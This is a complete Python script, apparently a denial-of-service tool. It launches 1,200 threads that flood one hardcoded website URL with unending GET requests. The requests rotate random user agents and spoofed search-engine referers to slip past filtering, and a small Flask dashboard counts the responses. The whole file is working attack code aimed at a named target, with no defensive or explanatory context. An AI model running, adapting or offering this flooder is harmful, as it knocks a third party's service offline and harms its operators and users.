from flask import Flask, jsonify
import requests
import threading
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import urllib3
import time
import random
app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()
accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]
stats = {"good": {}, "failed": 0}
lock = threading.Lock()
def chek(url):
    while True:
        try:
            headers = {
                "User-Agent": ua.random,
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept-Charset": accept_charset,
                "Referer": random.choice(headers_referers),
            }
            response = requests.get(url, headers=headers, verify=False)
            status_code = response.status_code
            with lock:
                stats["good"].setdefault(status_code, 0)
                stats["good"][status_code] += 1
        except requests.exceptions.RequestException:
            with lock:
                stats["failed"] += 1
def start_threads():
    target_url = "https://alamdar-mod.com/Revenge/public/connect"
    for _ in range(1200):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()
@app.route('/')
def home():
    with lock:
        return jsonify(stats)
if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
